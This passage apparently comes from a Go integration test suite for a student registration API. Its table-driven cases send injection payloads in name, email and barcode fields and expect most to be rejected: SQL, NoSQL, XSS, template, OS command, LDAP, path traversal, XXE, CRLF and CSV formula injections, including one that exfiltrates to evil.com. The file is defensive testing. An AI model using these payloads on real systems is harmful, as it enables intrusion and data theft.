			name: "Blind SQL Injection with Time Delay",
			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
				req.Email = "test@test.com'; WAITFOR DELAY '00:00:05'--"
			},
			expectedStatus:  http.StatusBadRequest,
			expectedMessage: "Email Address must be a valid email address",
			description:     "Time-based blind SQL injection attempt",
		},
		{
			name: "Union-based SQL Injection",
			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
				req.FirstName = "John' UNION SELECT username, password FROM users--"
			},
			expectedStatus:  http.StatusBadRequest,
			expectedMessage: "must be a valid name",
			description:     "Union-based SQL injection to extract data",
		},
		{
			name: "Stacked Queries SQL Injection",
			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
				req.LastName = "Smith'; INSERT INTO users (email, role) VALUES ('hacker@evil.com', 'admin')--"
			},
			expectedStatus:  http.StatusBadRequest,
			expectedMessage: "must be a valid name",
			description:     "Stacked queries injection",
		},
		{
			name:        "Second Order SQL Injection",
			description: "Second order SQL injection payload, must be sanitized on database level",
			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
				req.FirstName = "admin'--"
			},
			expectedStatus: http.StatusOK,
			setupBefore:    true,
			assertFunc: func(t *testing.T, u *user.UserAssertions) {
				u.AssertFirstName("admin'--")
			},
		},
		{
			name: "PostgreSQL Specific SQL Injection",
			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
				req.Barcode = "STU001'||pg_sleep(5)||'"
			},
			expectedStatus:  http.StatusBadRequest,
			expectedMessage: "Barcode must contain English letters and digits only",
			description:     "PostgreSQL specific time-based injection",
		},

		// NoSQL Injection Patterns
		{
			name: "MongoDB NoSQL Injection",
			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
				req.Email = "{\"$ne\":null}@test.com"
			},
			expectedStatus:  http.StatusBadRequest,
			expectedMessage: "Email Address must be a valid email address",
			description:     "MongoDB query operator injection",
		},
		{
			name: "JSON NoSQL Injection",
			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
				req.FirstName = "{\"$gt\":\"\"}"
			},
			expectedStatus:  http.StatusBadRequest,
			expectedMessage: "must be a valid name",
			description:     "JSON-based NoSQL injection",
		},

		// Advanced XSS Variants
		{
			name: "DOM-based XSS with Event Handler",
			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
				req.FirstName = "<div onmouseover=\"alert(document.cookie)\">Name</div>"
			},
			expectedStatus:  http.StatusBadRequest,
			expectedMessage: "must be a valid name",
			description:     "DOM XSS with mouse event",
		},
		{
			name: "XSS with SVG Payload",
			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
				req.LastName = "<svg onload=alert('XSS')>"
			},
			expectedStatus:  http.StatusBadRequest,
			expectedMessage: "must be a valid name",
			description:     "SVG-based XSS vector",
		},
		{
			name: "XSS with Data URI",
			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
				req.FirstName = "<a href=\"data:text/html,<script>alert('XSS')</script>\">Click</a>"
			},
			expectedStatus:  http.StatusBadRequest,
			expectedMessage: "must be a valid name",
			description:     "Data URI XSS attempt",
		},
		{
			name: "Polyglot XSS Payload",
			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
				req.LastName = "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//"
			},
			expectedStatus:  http.StatusBadRequest,
			expectedMessage: "must be a valid name",
			description:     "Polyglot payload working in multiple contexts",
		},
		{
			name: "XSS with JavaScript Protocol",
			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
				req.FirstName = "javascript:alert(1)"
			},
			expectedStatus:  http.StatusBadRequest,
			expectedMessage: "must be a valid name",
			description:     "JavaScript protocol handler",
		},

		// Template Injection
		{
			name: "Server-Side Template Injection (SSTI)",
			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
				req.FirstName = "{{7*7}}"
			},
			expectedStatus:  http.StatusBadRequest,
			expectedMessage: "must be a valid name",
			description:     "Basic SSTI payload",
		},
		{
			name: "Jinja2 Template Injection",
			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
				req.LastName = "{{ config.items() }}"
			},
			expectedStatus:  http.StatusBadRequest,
			expectedMessage: "must be a valid name",
			description:     "Jinja2 specific template injection",
		},

		// Command Injection
		{
			name: "OS Command Injection with Semicolon",
			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
				req.Barcode = "STU001;cat /etc/passwd"
			},
			expectedStatus:  http.StatusBadRequest,
			expectedMessage: "Barcode must contain English letters and digits only",
			description:     "Command injection with semicolon",
		},
		{
			name: "Command Injection with Backticks",
			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
				req.FirstName = "`whoami`"
			},
			expectedStatus:  http.StatusBadRequest,
			expectedMessage: "must be a valid name",
			description:     "Command substitution with backticks",
		},
		{
			name: "Command Injection with Pipe",
			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
				req.Barcode = "STU001|id"
			},
			expectedStatus:  http.StatusBadRequest,
			expectedMessage: "Barcode must contain English letters and digits only",
			description:     "Command chaining with pipe",
		},

		// LDAP Injection
		{
			name: "LDAP Injection with Wildcard",
			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
				req.Email = "*)(uid=*))(|(uid=*@test.com"
			},
			expectedStatus:  http.StatusBadRequest,
			expectedMessage: "Email Address must be a valid email address",
			description:     "LDAP filter injection",
		},
		{
			name: "LDAP Injection with Boolean Logic",
			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
				req.FirstName = "admin)(|(password=*"
			},
			expectedStatus:  http.StatusBadRequest,
			expectedMessage: "must be a valid name",
			description:     "LDAP boolean injection",
		},

		// Path Traversal
		{
			name: "Path Traversal with Dot Dot Slash",
			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
				req.FirstName = "../../../etc/passwd"
			},
			expectedStatus:  http.StatusBadRequest,
			expectedMessage: "must be a valid name",
			description:     "Directory traversal attempt",
		},
		{
			name: "Path Traversal with URL Encoding",
			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
				req.LastName = "..%2F..%2F..%2Fetc%2Fpasswd"
			},
			expectedStatus:  http.StatusBadRequest,
			expectedMessage: "must be a valid name",
			description:     "URL encoded path traversal",
		},
		{
			name: "Path Traversal with Double Encoding",
			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
				req.FirstName = "..%252f..%252f..%252fetc%252fpasswd"
			},
			expectedStatus:  http.StatusBadRequest,
			expectedMessage: "must be a valid name",
			description:     "Double URL encoded traversal",
		},

		// Unicode and Encoding Attacks
		{
			name: "Unicode Normalization Bypass",
			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
				req.FirstName = "ＡＤＭİＮ" // Full-width and Turkish i
			},
			expectedStatus: http.StatusOK,
			setupBefore:    true,
			description:    "Unicode normalization bypass",
			assertFunc: func(t *testing.T, u *user.UserAssertions) {
				u.AssertFirstName("ＡＤＭİＮ")
			},
		},
		{
			name: "Homograph Attack with Cyrillic",
			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
				req.Email = "аdmin@test.com" // Cyrillic 'а' instead of Latin 'a'
			},
			expectedStatus:  http.StatusBadRequest,
			expectedMessage: "Email Address must be a valid email address",
			description:     "IDN homograph attack",
		},
		{
			name: "Zero-Width Characters Injection",
			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
				req.FirstName = "John\u200B\u200CSmith" // Zero-width space and non-joiner
			},
			expectedStatus:  http.StatusBadRequest,
			expectedMessage: "must be a valid name",
			description:     "Zero-width character injection",
		},
		{
			name: "UTF-8 Overlong Encoding",
			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
				req.Barcode = "STU\xc0\xbc001" // Overlong encoding
			},
			expectedStatus:  http.StatusBadRequest,
			expectedMessage: "Barcode must contain English letters and digits only",
			description:     "UTF-8 overlong encoding attack",
		},

		// CSV Injection
		{
			name: "CSV Formula Injection",
			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
				req.FirstName = "=1+1+cmd|'/c calc'!A1"
			},
			expectedStatus:  http.StatusBadRequest,
			expectedMessage: "must be a valid name",
			description:     "CSV formula injection",
		},
		{
			name: "CSV Injection with HYPERLINK",
			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
				req.LastName = "=HYPERLINK(\"http://evil.com?data=\"&A1&A2,\"Click\")"
			},
			expectedStatus:  http.StatusBadRequest,
			expectedMessage: "must be a valid name",
			description:     "CSV injection with hyperlink",
		},

		// XML/XXE Injection
		{
			name: "XXE Attack Payload",
			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
				req.FirstName = "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>"
			},
			expectedStatus:  http.StatusBadRequest,
			expectedMessage: "must be a valid name",
			description:     "XML External Entity attack",
		},
		{
			name: "XML Bomb (Billion Laughs)",
			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
				req.LastName = "<!DOCTYPE lolz [<!ENTITY lol \"lol\"><!ENTITY lol2 \"&lol;&lol;\">]>"
			},
			expectedStatus:  http.StatusBadRequest,
			expectedMessage: "must be a valid name",
			description:     "XML bomb DoS attack",
		},

		// Header Injection
		{
			name: "CRLF Injection in Email",
			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
				req.Email = "test@test.com\r\nBcc:attacker@evil.com"
			},
			expectedStatus:  http.StatusBadRequest,
			expectedMessage: "Email Address must be a valid email address",
			description:     "CRLF injection for header manipulation",
		},
		{
			name: "HTTP Response Splitting",
			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
				req.FirstName = "John\r\n\r\n<script>alert(1)</script>"
			},
			expectedStatus:  http.StatusBadRequest,
			expectedMessage: "must be a valid name",
			description:     "HTTP response splitting attempt",
		},

		// JSON Injection
		{
			name: "JSON Structure Breaking",
			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
				req.FirstName = "\",\"role\":\"admin\",\"name\":\""
			},
			expectedStatus:  http.StatusBadRequest,
			expectedMessage: "must be a valid name",
			description:     "JSON structure manipulation",
		},
		{
			name: "JSON Unicode Escape Injection",
			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
				req.LastName = "\\u0022,\\u0022role\\u0022:\\u0022admin\\u0022"
			},
			expectedStatus:  http.StatusBadRequest,
			expectedMessage: "must be a valid name",
			description:     "JSON with unicode escapes",
		},

		// Regular Expression DoS (ReDoS)
		{
			name: "ReDoS Attack Pattern",
			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
				req.Email = strings.Repeat("a", 50) + strings.Repeat("a!", 50) + "@test.com"
			},
			expectedStatus:  http.StatusBadRequest,
			expectedMessage: "Email Address must be a valid email address",
			description:     "Regex denial of service pattern",
		},

		// Format String Attack
		{
			name: "Format String Vulnerability",
			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
				req.FirstName = "%s%s%s%s%s%s%s%s%s%s"
			},
			expectedStatus:  http.StatusBadRequest,
			expectedMessage: "must be a valid name",
			description:     "Format string attack",
		},
		{
			name: "Printf Format Injection",
			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
				req.LastName = "%x %x %x %x"
			},
			expectedStatus:  http.StatusBadRequest,
			expectedMessage: "must be a valid name",
			description:     "Printf format string injection",
		},

		// Business Logic Bypass Attempts
		{
			name: "Case Variation Bypass",
			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
				req.FirstName = "aDmIn"
			},
			expectedStatus: http.StatusOK,
			setupBefore:    true,
			description:    "Case variation for bypass attempts",
		},
		{
			name: "Negative Number Injection",
			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
				req.VerificationCode = "-1"
			},
			expectedStatus:  http.StatusBadRequest,
			expectedMessage: "Verification Code",
			description:     "Negative number for integer fields",
		},
		{
			name: "Emoji Injection",
			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
				req.FirstName = "John😀Smith"
			},
			expectedStatus:  http.StatusBadRequest,
			expectedMessage: "must be a valid name",
			description:     "Emoji characters in name fields",
		},
		{
			name: "Right-to-Left Override",
			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
				req.LastName = "Smith\u202Etxt.exe" // RLO character
			},
			expectedStatus:  http.StatusBadRequest,
			expectedMessage: "must be a valid name",
			description:     "Right-to-left override character",
		},
		{
			name: "Name with Numbers",
			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
				req.FirstName = "John123"
			},
			expectedStatus:  http.StatusBadRequest,
			expectedMessage: "must be a valid name",
			description:     "Numbers in names should be rejected",
		},
		{
			name: "Name with HTML Tags",
			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
				req.FirstName = "<script>alert('xss')</script>"
			},
			expectedStatus:  http.StatusBadRequest,
			expectedMessage: "must be a valid name",
			description:     "HTML tags should be rejected",
		},
		{
			name: "Name with Special Symbols",
			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
				req.FirstName = "John@#$%"
			},
			expectedStatus:  http.StatusBadRequest,
			expectedMessage: "must be a valid name",
			description:     "Special symbols should be rejected",
		},
	}

	for _, tt := range tests {
		s.T().Run(tt.name, func(t *testing.T) {
			request := registrationhttp.CompleteStudentRegistrationRequest{
				Email:            fixtures.TestStudent.Email,
				VerificationCode: "123456",
				Password:         fixtures.TestStudent.Password,
				Barcode:          string(fixtures.TestStudent.Barcode),
				Username:         fixtures.TestStudent.Username,
				FirstName:        fixtures.TestStudent.FirstName,
				LastName:         fixtures.TestStudent.LastName,
				GroupId:          uuid.UUID(fixtures.SEGroup.ID),
			}

			if tt.setupBefore {
				uniqueEmail := fmt.Sprintf("test-%d-%s@test.com", time.Now().UnixNano(), strings.ReplaceAll(tt.name, " ", "-"))
				request.Email = uniqueEmail
				s.setupVerifiedRegistration(uniqueEmail)
				request.VerificationCode = s.getVerificationCode(uniqueEmail)
				// length is 6, rundomly generated
				request.Barcode = fmt.Sprintf("SE%06d", time.Now().UnixNano()%1000000)
				request.Username = fmt.Sprintf("user_%d", time.Now().UnixNano()%1000000)
			}

			tt.setup(&request)
			response := s.HTTP.CompleteStudentRegistration(t, request)
			response.AssertStatus(tt.expectedStatus)
			if tt.expectedMessage != "" {
				response.AssertContainsMessage(tt.expectedMessage)
			}
			if tt.assertFunc != nil {
				tt.assertFunc(t, s.DB.RequireUserExists(t, request.Email))
			}
		})
	}
}

func (s *RegistrationIntegrationSuite) setupVerifiedRegistration(email string) {
	if !s.DB.CheckGroupExists(s.T(), fixtures.SEGroup.ID) {
		s.DB.SeedGroup(s.T(), fixtures.SEGroup.ID, fixtures.SEGroup.Name, fixtures.SEGroup.Year, fixtures.SEGroup.Major)
	}
	s.HTTP.StartStudentRegistration(s.T(), email).RequireAccepted()
	reg := s.DB.RequireRegistrationExists(s.T(), email)
	s.HTTP.VerifyRegistrationCode(s.T(), email, reg.Registration.VerificationCode()).RequireSuccess()
}

func (s *RegistrationIntegrationSuite) setupCompletedRegistration(email string) {
	s.setupVerifiedRegistration(email)
	s.HTTP.CompleteStudentRegistration(s.T(), registrationhttp.CompleteStudentRegistrationRequest{
		Email:            email,
		VerificationCode: s.getVerificationCode(email),
		Password:         fixtures.TestStudent.Password,
		Barcode:          "STU999",
		Username:         "teststudent999",
		FirstName:        "Test",
		LastName:         "Student",
		GroupId:          uuid.UUID(fixtures.SEGroup.ID),
	}).AssertSuccess()
}

func (s *RegistrationIntegrationSuite) getVerificationCode(email string) string {
	return s.DB.RequireRegistrationExists(s.T(), email).Registration.VerificationCode()
}

func (s *RegistrationIntegrationSuite) TestGetVerificationCodeEndpoint() {
	s.T().Run("Success - Returns verification code for existing registration", func(t *testing.T) {
		email := "devcode@test.com"
		s.HTTP.StartStudentRegistration(t, email).RequireAccepted()

		expectedCode := s.getVerificationCode(email)

		response := s.HTTP.GetVerificationCode(t, email)
		response.RequireStatus(http.StatusOK)

		var respData map[string]any
		response.RequireParseJSON(&respData)
		require.Equal(t, expectedCode, respData["verification_code"])
	})

	s.T().Run("Invalid email format", func(t *testing.T) {
		s.HTTP.GetVerificationCode(t, "invalid-email").
			AssertBadRequest()
	})

	s.T().Run("Registration not found", func(t *testing.T) {
		s.HTTP.GetVerificationCode(t, "notfound@test.com").
			AssertStatus(http.StatusNotFound)
	})
}
